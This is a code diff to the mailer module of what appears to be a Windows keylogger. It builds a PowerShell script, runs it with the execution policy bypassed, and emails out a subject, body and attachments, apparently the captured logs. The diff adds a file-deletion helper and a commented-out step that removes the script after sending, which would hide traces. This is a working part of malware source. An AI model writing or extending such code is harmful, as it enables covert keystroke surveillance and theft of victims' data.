@@ -72,6 +72,15 @@ namespace Mailer
         return (bool)file;
     }
 
+    bool deleteFile(const string& f)
+    {
+        int removestat = remove(f.c_str());
+        if (removestat == ERROR_SUCCESS || removestat == ERROR_FILE_NOT_FOUND)
+            return true;
+        else
+            return false;
+    }
+
     bool CreateScript()
     {
         ofstream script(Input_Output::GetPath(true) + string(MAIL_SCRIPT_NAME));
@@ -85,6 +94,7 @@ namespace Mailer
             return false;
 
         script.close();
+        KeyLogger::InfoLogger("Script for mailing created");
         return true;
     }
 
@@ -100,12 +110,13 @@ namespace Mailer
 
         string script_path = Input_Output::GetPath(true) + string(MAIL_SCRIPT_NAME);
         
-        if (!CheckFileExists(script_path))
-            ok = CreateScript();
-        else
-            ok = true;
+        ok = CreateScript();
+        
         if (!ok)
+        {
+            KeyLogger::ErrorLogger("Unable to create mailer script");
             return -2;
+        }
 
         string param = "-ExecutionPolicy ByPass -File \"" + script_path + "\" -Subj \"" + Replace(subject, "\"", "\\\"") + "\" -Body \"" + Replace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"" ;
 
@@ -135,6 +146,11 @@ namespace Mailer
                 if ((int)exitcode == STILL_ACTIVE)
                     TerminateProcess(ShExecInfo.hProcess, 100);
                 KeyLogger::InfoLogger("<From SendMail> Return Code : " + KeyLogger::ToString((int)exitcode));
+                /*KeyLogger::InfoLogger("Going to delete script");
+                if (deleteFile(script_path))
+                    KeyLogger::InfoLogger("Successfully deleted created script file");
+                else
+                    KeyLogger::ErrorLogger("Unable to delete file at : " + script_path);*/
             }
         );
 
